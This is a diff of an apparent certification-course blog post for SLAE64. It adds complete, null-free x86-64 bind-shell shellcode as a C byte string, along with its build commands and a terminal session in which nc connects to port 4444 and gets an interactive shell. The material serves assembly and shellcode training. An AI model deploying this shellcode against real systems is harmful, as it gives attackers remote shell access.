@@ -90,7 +90,7 @@ It seems as this assembly program has a great quantity of null opcodes. However,
 instance, when a single byte such as 1 is being inserted into a 64-bit register such as RAX, a lot of nulls will be parsed as well. This could easily be circumvented by pushing 
 such bytes as WORDs and then saving such values in Lower 16 bit registers such as ax, bx, dx, bp, and so forth. 
 
-Other techniques could be simply implement using a lower bit register such as Lower 8-bits instead of 64-bits when it comes to small operations. 
+Other techniques could simply implement using a lower bit register such as lower 8-bits instead of 64-bits when it comes to small operations. 
 
 Final code:
 
@@ -247,4 +247,57 @@ _start:
         syscall
 ```
 
+Let's assemble, link this and get its shellcode!
 
+```term
+whitecr0wz@SLAE64:~/assembly/assignments/Assignment_1/B$ nasm -f elf64 1.asm -o 1.o && ld 1.o -o 1 && for i in $(objdump -d 1 -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
+```
+
+C format:
+
+```term
+#include <stdio.h>
+#include <string.h>
+
+unsigned char code[] = \
+"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\xb0\x29\x48\xff\xc7\x48\xff\xc7\x48\xff\xc6\x48\x31\xd2\x0f\x05\x48\x89\xc7\x48\x31\xc0\x50\x48\x31\xed\x66\x6a\x02\x66\x5d\x89\x44\x24\xfc\x66\xc7\x44\x24\xfa\x11\x5c\x66\x89\x6c\x24\xf8\x48\x83\xec\x08\xb0\x31\x48\x89\xe6\xb2\x10\x0f\x05\x66\x6a\x02\x66\x5d\xb0\x32\x48\x89\xee\x0f\x05\xb0\x2b\x48\x83\xec\x10\x48\x89\xe6\xc6\x44\x24\xff\x10\x48\x83\xec\x01\x48\x89\xe2\x0f\x05\x49\x89\xc1\xb0\x03\x0f\x05\x4c\x89\xcf\xb0\x21\x48\x31\xf6\x0f\x05\xb0\x21\x66\x6a\x01\x66\x5d\x48\x89\xee\x0f\x05\xb0\x21\x66\x6a\x02\x66\x5d\x48\x89\xee\x0f\x05\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05"
+
+;
+
+main()
+{
+ 
+printf("Shellcode Length:  %d\n", (int)strlen(code));
+ 
+int (*ret)() = (int(*)())code;
+ 
+ret();
+ 
+}
+```
+
+#### EndGame
+
+```term
+whitecr0wz@SLAE64:~/assembly/assignments/Assignment_1/B$ gcc null-free.c -o null-free -fno-stack-protector -z execstack -w 
+whitecr0wz@SLAE64:~/assembly/assignments/Assignment_1/B$ ./null-free 
+Shellcode Length:  177
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+root@whitecr0wz:~# rlwrap nc 192.168.100.205 4444 -v 
+192.168.100.205: inverse host lookup failed: Unknown host
+(UNKNOWN) [192.168.100.205] 4444 (?) open
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+whitecr0wz@SLAE64:/home/whitecr0wz/assembly/assignments/Assignment_1/B$ id 
+id 
+uid=1000(whitecr0wz) gid=1000(whitecr0wz) groups=1000(whitecr0wz),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
+whitecr0wz@SLAE64:/home/whitecr0wz/assembly/assignments/Assignment_1/B$ 
+```
+
+### Code
+
+This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-
+courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)
+
+Student ID: SLAE64–27812/PA-27812
+
+You can find all of the used resources within this post [here](https://github.com/whitecr0wz/SLAE/tree/main/SLAE64/Assignment_1/B).
